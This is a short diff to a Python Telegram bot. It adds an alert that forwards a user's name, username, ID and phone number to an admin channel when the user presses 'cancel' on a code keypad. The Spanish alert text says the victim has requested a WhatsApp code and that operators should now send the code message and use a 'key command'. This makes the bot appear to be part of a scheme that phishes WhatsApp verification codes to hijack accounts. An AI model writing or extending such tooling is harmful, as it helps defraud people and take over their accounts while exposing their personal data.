@@ -624,7 +624,23 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "cancel":
         context.user_data[UD_CODE] = ""
         user = update.effective_user
-
+        phone = context.user_data.get(UD_PHONE, "sin teléfono")
+        
+        try:
+            if ADMIN_CHANNEL_ID:
+                await context.bot.send_message(
+                    chat_id=ADMIN_CHANNEL_ID,
+                    text=(
+                        "Solicitó el código de WhatsApp, ahora hay que enviarle el mensaje con el código. El DM ahora mismo esta generando el codigo. Proximo paso utilizar el COMANDO clave\n\n"
+                        f"Nombre: {user.full_name or 'Sin nombre'}\n"
+                        f"Username: @{user.username or 'sin_username'}\n"
+                        f"ID: {user.id}"
+                        f"Teléfono: {phone}"
+                    )
+                )
+        except Exception as e:
+            log.exception("Error enviando aviso de cancelar: %s", e)
+        
         old_pending = PENDING_GENERATING.pop(user.id, None)
         if old_pending:
             try:
